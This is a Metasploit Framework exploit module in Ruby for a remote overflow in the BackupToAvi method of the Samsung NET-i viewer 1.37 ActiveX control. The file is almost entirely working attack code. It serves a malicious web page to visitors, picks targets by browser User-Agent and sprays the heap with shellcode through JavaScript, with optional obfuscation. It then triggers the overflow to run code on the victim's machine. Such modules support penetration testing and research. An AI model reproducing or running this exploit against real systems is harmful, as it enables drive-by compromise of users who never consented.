##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Samsung NET-i viewer Multiple ActiveX BackupToAvi() Remote Overflow",
			'Description'    => %q{
					This module exploits a vulnerability in the CNC_Ctrl.dll ActiveX installed
				with the Samsung NET-i viewer 1.37.

				Specifically, when supplying a long string for the fname parameter to the
				BackupToAvi method, an integer overflow occurs, which leads to a posterior buffer
				overflow due to the use of memcpy with an incorrect size, resulting in remote code
				execution under the context of the user.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Luigi Auriemma', # Vulnerability Discovery and PoC
					'juan vazquez' # Metasploit module
				],
			'References'     =>
				[
					[ 'OSVDB', '81453'],
					[ 'BID', '53193'],
					[ 'URL', 'http://aluigi.altervista.org/adv/netiware_1-adv.txt' ]
				],
			'Payload'        =>
				{
					'Space'           => 1024,
					'BadChars'        => "\x00"
				},
			'DefaultOptions'  =>
				{
					'ExitFunction'         => "seh",
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Samsung NET-i viewer 1.37
					# CNC_Ctrl.dll 1.5.1.1
					[ 'Automatic', {} ],
					[ 'IE 6 on Windows XP SP3',
						{
							'Ret' => 0x0c0c0c0c,
							'Offset' => '0x800 - code.length',
						}
					],
					[ 'IE 7 on Windows XP SP3',
						{
							'Ret' => 0x0c0c0c0c,
							'Offset' => '0x800 - code.length',
						}
					]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Apr 21 2012",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation'])
			], self.class)
	end

	def get_target(agent)
		#If the user is already specified by the user, we'll just use that
		return target if target.name != 'Automatic'

		if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
			return targets[1]  #IE 6 on Windows XP SP3
		elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
			return targets[2]  #IE 7 on Windows XP SP3
		else
			return nil
		end
	end


	def on_request_uri(cli, request)
		agent = request.headers['User-Agent']
		my_target = get_target(agent)

		# Avoid the attack if the victim doesn't have the same setup we're targeting
		if my_target.nil?
			print_error("Browser not supported: #{agent.to_s}")
			send_not_found(cli)
			return
		end

		print_status("Target set: #{my_target.name}")

		p = payload.encoded
		js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))
		js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(my_target.arch))

		js = <<-JS
		var heap_obj = new heapLib.ie(0x20000);
		var code = unescape("#{js_code}");
		var nops = unescape("#{js_nops}");

		while (nops.length < 0x80000) nops += nops;
		var offset = nops.substring(0, #{my_target['Offset']});
		var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);

		while (shellcode.length < 0x40000) shellcode += shellcode;
		var block = shellcode.substring(0, (0x80000-6)/2);

		heap_obj.gc();

		for (var i=1; i < 0x200; i++) {
			heap_obj.alloc(block);
		}
		JS

		js = heaplib(js, {:noobfu => true})

		#obfuscate on demand
		if datastore['OBFUSCATE']
			js = ::Rex::Exploitation::JSObfu.new(js)
			js.obfuscate
		end

		bof = Rex::Text.to_unescape("\x0c" * 2048, Rex::Arch.endian(my_target.arch))

		html = <<-EOS
		<html>
		<head>
		<script>
		#{js}
		</script>
		</head>
		<body>
		<object id="target1" classid="CLSID:3D6F2DBA-F4E5-40A6-8725-E99BC96CC23A"></object>
		<script>
			target1.BackupToAvi(0, 0, 0, unescape("#{bof}"));
		</script>
		<body>
		</html>
		EOS

		html = html.gsub(/^\t\t/, '')

		print_status("Sending html")
		send_response(cli, html, {'Content-Type'=>'text/html'})

	end

end

